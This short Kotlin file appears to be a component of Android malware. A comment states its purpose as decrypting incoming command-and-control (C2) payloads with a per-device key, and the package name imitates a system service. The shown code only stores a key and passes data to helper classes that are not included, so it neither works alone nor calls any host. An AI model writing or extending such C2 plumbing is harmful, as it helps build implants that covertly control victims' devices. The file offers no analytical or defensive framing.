// [context: Kotlin, Android API 26+, decrypt incoming C2 payloads with per-device key]
package com.system.service.crypto

import android.content.Context

object PayloadDecryptor {

    private var sessionKey: ByteArray? = null

    fun init(key: ByteArray) { sessionKey = key }

    fun decrypt(data: ByteArray): ByteArray? {
        val key = sessionKey ?: KeyDerivation.deriveDeviceKey()
        return SessionCrypto.decrypt(data, key)
    }

    fun decryptWithKey(data: ByteArray, key: ByteArray): ByteArray? =
        SessionCrypto.decrypt(data, key)
}
